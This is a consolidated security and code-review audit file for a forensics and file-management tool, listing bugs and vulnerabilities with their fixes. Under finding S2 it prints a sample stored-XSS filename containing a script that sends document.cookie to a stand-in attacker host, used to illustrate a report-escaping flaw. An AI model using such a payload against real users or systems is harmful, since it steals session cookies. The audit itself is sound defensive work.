# Audit Findings — Bugs, Security & Forensic Hardening

**Date:** 2026-07-10 · **Updated:** 2026-07-12 · **Last verified:** 2026-07-12
**Consolidates** the old `01_CODE_REVIEW_AND_BUGS.md` + `02_SECURITY_AND_FORENSIC_AUDIT.md` into one file. No information was removed — this is a merge, not a rewrite.

> **2026-07-12 reconciliation.** WS-B (see [`IMPLEMENTATION_PLAN.md`](./IMPLEMENTATION_PLAN.md)
> §4) is closed: **S4–S13 are all fixed** and re-verified against the current source.
> The remaining forensic-soundness work (chain-of-custody, Evidence Mode, acquisition
> provenance, UTC timestamps) is now tracked as F1–F21 / U1–U11 in
> [`FORENSIC_SECURITY_REVIEW.md`](./FORENSIC_SECURITY_REVIEW.md), which supersedes the
> "Forensic-soundness checklist" rows below for the items it covers.

---

## Part 1 — Code Correctness Bugs

> **Status:** every correctness finding below has been **fixed**. 301 tests pass. Kept as a changelog with file/line pointers — not open work.

### Severity legend

| Severity | Meaning |
| --- | --- |
| 🔴 High | Broken behaviour, data-loss risk, or false product claims. |
| 🟠 Medium | Real defect under realistic conditions (bad input, concurrency, edge case). |
| 🟡 Low | Correctness smell, hygiene, or robustness gap; low blast radius. |

### 🔴 Fixed — HIGH

- **H1** — `tests/test_comprehensive.py` imported `rename_with_regex`, which didn't exist → pytest failed at collection (only 77/~224 tests ran). Restored `rename_with_regex` in `core/operations/files.py` (thin wrapper over `rename_path` + `re.sub`) and fixed 3 other stale tests.

### 🟠 Fixed — MEDIUM

- **M1** — `fm hash-calc --algo sha512` crashed (`KeyError` in CLI). `core/hasher.py` now supports `sha512`/`blake2b`.
- **M2** — `IntegrityMonitor.verify_snapshot` crashed on truncated snapshot (`JSONDecodeError` not caught). Now catches `(OSError, json.JSONDecodeError)`.
- **M3** — `scanner.py` followed symlinks by default (recursion DoS + scope escape). Now skips symlinks with `follow_symlinks=False`.
- **M4** — Integrity hashing hardcoded MD5 regardless of config. `create_snapshot`/`verify_snapshot` now read `hash_algorithm` from config and write self-describing snapshots, with legacy flat-MD5 snapshots still readable.
- **M5** — Shared SQLite cache had no locking → `database is locked` under concurrent `BackgroundWorker` threads. Now wraps every method in `threading.Lock` + `PRAGMA journal_mode=WAL`.
- **M6** — Duplicate detection deleted on hash equality alone (default was MD5). Config default now `sha256`; `select_duplicate_records(verify_content=True)` byte-compares each non-keeper.

### 🟡 Fixed — LOW

- **L1** — Bare `except:` in filters/media actions silently coerced bad input to `0`. Now catches `(ValueError, TypeError)`.
- **L2** — `media_ops.py` / `plugin_loader.py` used `print()` for errors. Now use `logger.error(...)`.
- **L3** — `convert_image` had no-op `except Exception as e: raise e`. Now catches `(OSError, ValueError)`, logs, re-raises.
- **L4** — `modules/metadata.py` shelled out to `exiftool -ver` at import time. Probe is now `@lru_cache`d and lazy.
- **L5** — `render_template_name` used naive `str.replace` on template tokens. Now via `string.Formatter().vformat`.
- **L6** — `requirements.txt` mixed runtime and dev deps. Split into `requirements.txt` (runtime) + `requirements-dev.txt`.
- **L7** — Stray empty `26.1.2` file deleted; root `.gitignore` added.
- **L8** — Windows Recycle Bin scan silently returned `[]`. Now raises `TrashScanUnsupported`, surfaced in CLI and GUI.
- **L9** — `_run_john_dictionary` always reported `success: True`. Now derives from return code.

### Cross-cutting architecture concerns

*Moved to [`IMPROVEMENT_PLAN.md`](./IMPROVEMENT_PLAN.md) §Engineering Improvements.* These are structural overlaps (two filter engines, two metadata cleaners, dead `LocalProvider`) that aren't bugs per se but create correctness risk — the improvement plan tracks them as Phase 2 architecture items.

---

## Part 2 — Security & Forensic Findings

**Reviewer role:** Application security engineer / digital-forensics practitioner.
**Threat framing:** This app both *(a)* operates on untrusted data and *(b)* performs privileged/destructive actions. That combination is what makes its security posture matter.

> **Positive baseline:** No shell injection surface (all `subprocess` calls use argv list; no `shell=True`, `eval`, `exec`, `pickle`, `yaml.load`). Safe-delete-by-default (trash via `send2trash`). Preview → confirm → execute pattern. Cancellation tokens exist.

### Findings index

| ID | Severity | Title | Status |
| --- | --- | --- | --- |
| S1 | 🔴 High | MD5 used for integrity/tamper-evidence and as dedup default | ✅ Fixed |
| S2 | 🔴 High | Forensic HTML report is vulnerable to stored HTML/JS injection (XSS) | ✅ Fixed |
| S3 | 🟠 Medium | Symlink-following scan → scope escape, TOCTOU, recursion DoS | ✅ Fixed |
| S4 | 🟠 Medium | `restore_from_trash` trusts attacker-controllable `.trashinfo` path → arbitrary write | ✅ Fixed (WS-B) |
| S5 | 🟠 Medium | Plugin loader executes arbitrary local Python with full app privileges | ✅ Fixed (WS-B) |
| S6 | 🟠 Medium | `secure_delete` gives false assurance (SSD/CoW) and falls back to trash | ✅ Fixed (WS-B) |
| S7 | 🟠 Medium | System Cleanup classifies whole system/temp dirs as "junk" | ✅ Fixed (WS-B) |
| S8 | 🟠 Medium | Sensitive credential material handled with weak hygiene | ✅ Fixed (WS-B) |
| S9 | 🟡 Low | XML parsing without hardening (`recently-used.xbel`) — entity-expansion DoS | ✅ Fixed (WS-B) |
| S10 | 🟡 Low | No config validation; blind merge of `~/.dataforge/config.json` | ✅ Fixed (WS-B) |
| S11 | 🟡 Low | Opening scanned files via system handler (`xdg-open`/`startfile`) | ✅ Fixed (WS-B) |
| S12 | 🟡 Low | Forensic outputs/reports written with default (often world-readable) permissions | ✅ Fixed (WS-B) |
| S13 | 🟡 Low | Decompression-bomb exposure in image/PDF handling | ✅ Fixed (WS-B) |

### ✅ S1 — MD5 as the integrity and de-duplication digest *(Fixed)*
Config default `hash_algorithm` is now `sha256`; `IntegrityMonitor` reads from config and writes self-describing snapshots; duplicate deletion byte-verifies each group.

### ✅ S2 — Stored HTML/JS injection in the forensic HTML report *(Fixed)*
- **Where:** `dataforge/modules/forensics.py:581-625` (`_forensic_report_html`).
- Attacker-influenced strings (`username`, `home`, `shell`, `filename`) are concatenated into HTML with **no escaping**.
- **Risk:** an evidence artefact named `"><script>fetch('//attacker/'+document.cookie)</script>.jpg` becomes live script when opened in a browser — stored XSS in examiner context. Disqualifying for court-grade output.
- **Fix:** every interpolated value is now passed through `html.escape(str(v))`. Regression test `test_forensic_report_html_escapes_script_filename` in `tests/test_new_modules.py` asserts a `<script>` filename is neutralized in the rendered report.

### ✅ S3 — Symlink-following scan *(Fixed)*
`scan_directory` now skips symlinks with `follow_symlinks=False` everywhere (see M3 above).

### ✅ S4 — Trash restore trusts attacker-controllable metadata → arbitrary file write *(Fixed — WS-B)*
- **Where:** `modules/recovery.py:205-309`.
- `original_path` from `.trashinfo` was used directly as `shutil.move` destination, with `os.makedirs` creating parent dirs. USB stick with crafted `.trashinfo` could write attacker files to arbitrary writable paths.
- **Fixed:** `_is_safe_restore_path` (lines 205-227) rejects non-absolute paths, `..` traversal, and system directories; unsafe paths are redirected to a confined `restore_root` fallback and `os.makedirs` (line 283) runs only inside it. Guards: `test_restore_from_trash_confines_*` (2 tests). Residual chain-of-custody audit-hook tracked as **F19** in [`FORENSIC_SECURITY_REVIEW.md`](./FORENSIC_SECURITY_REVIEW.md).

### ✅ S5 — Plugin loader executes arbitrary local Python *(Fixed — WS-B)*
- **Where:** `ui/plugin_loader.py:40-75`.
- Any `.py` in the plugins dir was imported in-process with full privileges — no signing, manifest, sandbox.
- **Fixed:** loading is opt-in behind an `enabled` flag; the plugins directory is rejected if group/world-writable (`_check_plugin_dir_permissions`) and each file is skipped unless owned by the running UID (`_check_plugin_file_owner`). Deeper isolation (process sandbox, signing/manifest, per-load audit entry) is tracked as **F12** in [`FORENSIC_SECURITY_REVIEW.md`](./FORENSIC_SECURITY_REVIEW.md).

### ✅ S6 — `secure_delete` overstates its guarantee *(Fixed — WS-B)*
- **Where:** `modules/forensics.py:912-958`.
- Overwrite-in-place doesn't work on SSDs/flash, CoW filesystems, or journaled FS. Fell back to `send2trash` on unlink failure — moving the file you asked to *destroy* into the trash.
- **Fixed:** relabelled "best-effort overwrite" with an SSD/flash/CoW `.. warning::` docstring caveat; trash fallback removed. The remaining architectural work — moving it out of the forensic module and making it hardlink/reflink-aware — is tracked as **F4** and **F21** in [`FORENSIC_SECURITY_REVIEW.md`](./FORENSIC_SECURITY_REVIEW.md).

### ✅ S7 — System Cleanup treats entire system/temp trees as deletable "junk" *(Fixed — WS-B)*
- **Where:** `modules/system_cleanup.py:201-300`.
- Any file under System Temp / User Cache / Thumbnails / Trash / Crash Reports was blanket-classified junk; user-supplied paths inherited this. Active `/tmp` content, Unix sockets, lock files could be deleted.
- **Fixed:** user-supplied `--path` no longer inherits blanket classification (stricter extension/name rule, lines 277-281); sockets/FIFOs are skipped (line 267); System Temp carries a one-day minimum-age guard (lines 273-275). Guard: `test_junk_scan_never_blanket_classifies_user_supplied_path`. The residual allow-list precision work for built-in category roots is tracked as **F18** in [`FORENSIC_SECURITY_REVIEW.md`](./FORENSIC_SECURITY_REVIEW.md).

### ✅ S8 — Sensitive credential material handled with weak hygiene *(Fixed — WS-B)*
- **Where:** `modules/password_tools.py`.
- Cracked hashes/plaintext passwords were written to world-readable `/tmp` files; password first-2-chars leaked in strength display.
- **Fixed:** hash/credential files written with `0600` and displayed passwords fully masked (commit `e2cf51d`).

### ✅ S9–S13 — Low severity *(All fixed — WS-B)*
- **S9** — Unhardened XML parsing in `forensics.py` (billion-laughs DoS). Fixed: `defusedxml.ElementTree` (`forensics.py:1048`).
- **S10** — No config validation; blind merge of `config.json`. Fixed: types/ranges/enums validated on load (commit `04f25c4`); guard `test_config_merge_validates_and_clamps_bad_values`.
- **S11** — Opening untrusted scanned files via OS default handler. Fixed: executable-open confirmation before `xdg-open`/`startfile`/`open` (commit `961cf7f`, `widgets.py:860-866`).
- **S12** — Forensic outputs written with default permissions (world-readable). Fixed: report artefacts written `0600`. Report *integrity* (hash-chain over the snapshot) remains open as **F1**/**F11** in [`FORENSIC_SECURITY_REVIEW.md`](./FORENSIC_SECURITY_REVIEW.md).
- **S13** — Decompression-bomb exposure in Pillow/PDF parsing. Fixed: `MAX_IMAGE_PIXELS` policy and PDF page caps. Full parser-process isolation remains open as **F13** in [`FORENSIC_SECURITY_REVIEW.md`](./FORENSIC_SECURITY_REVIEW.md).

---

## Forensic-soundness checklist

> These architectural rows are now tracked in detail — with `path:line` evidence,
> owning seam, and test — in [`FORENSIC_SECURITY_REVIEW.md`](./FORENSIC_SECURITY_REVIEW.md)
> (F1–F21 / U1–U11), which **supersedes this table** for the items it covers.

| Expectation | Status | Owning finding |
| --- | --- | --- |
| Read-only evidence handling | ⚠️ Partial | Carving/parsing read-only; explicit Evidence Mode is **F3 / U2**. |
| Authoritative hashing (SHA-256) | ✅ | Default is SHA-256 (S1 fixed); every manifest uses config's algorithm. |
| Report integrity / non-repudiation | ⚠️ Partial | Report perms `0600` and HTML escaped (S12/S2 fixed); hash-chain over reports/snapshot is **F1 / F11**. |
| Deterministic, timezone-aware timestamps | ⚠️ Partial | Timeline uses UTC; report still naive/local. Standardise on UTC ISO-8601 — **F9**. |
| Chain-of-custody / audit log | ❌ | No tamper-evident action log. Append-only audit trail is **F1**. |
| Tool/version + input provenance in reports | ⚠️ Partial | Add tool version, host, operator, source-image hash — **F2**. |
| Hostile-input hardening | ✅/⚠️ | S9 (`defusedxml`) and S13 (bomb caps) fixed; full parser-process isolation is **F13**. |
| Locked / in-use file & VSS acquisition | ❌ | Locked artefacts silently skipped; no shadow-copy path — **F20**. |

## Recommended remediation order

The security backlog (S1–S13) is **complete** — all closed across WS-A/WS-B:

1. ~~**S2** (report XSS)~~ — fixed: `html.escape()` on every interpolated value + regression test.
2. ~~**S4 / S7**~~ — fixed: trash-restore path confinement; cleanup no longer blanket-classifies user paths.
3. ~~**S5 / S6 / S8**~~ — fixed: plugin loader hardened (owner/perms/opt-in), `secure_delete` best-effort with no trash fallback, credential files `0600`.
4. ~~**S9–S13**~~ — fixed: `defusedxml`, config validation, executable-open confirm, `0600` reports, decompression-bomb caps.

The next tranche is **forensic soundness**, not point security: chain-of-custody
(F1), acquisition provenance (F2), Evidence Mode (F3/U2), and parser isolation
(F13) — sequenced in [`IMPLEMENTATION_PLAN.md`](./IMPLEMENTATION_PLAN.md) as
WS-H/WS-I/WS-J. The architecture (centralised `FileActionService`, single scanner,
preview/confirm) is the right place to enforce these controls once — fixing at the
seam is high-leverage.
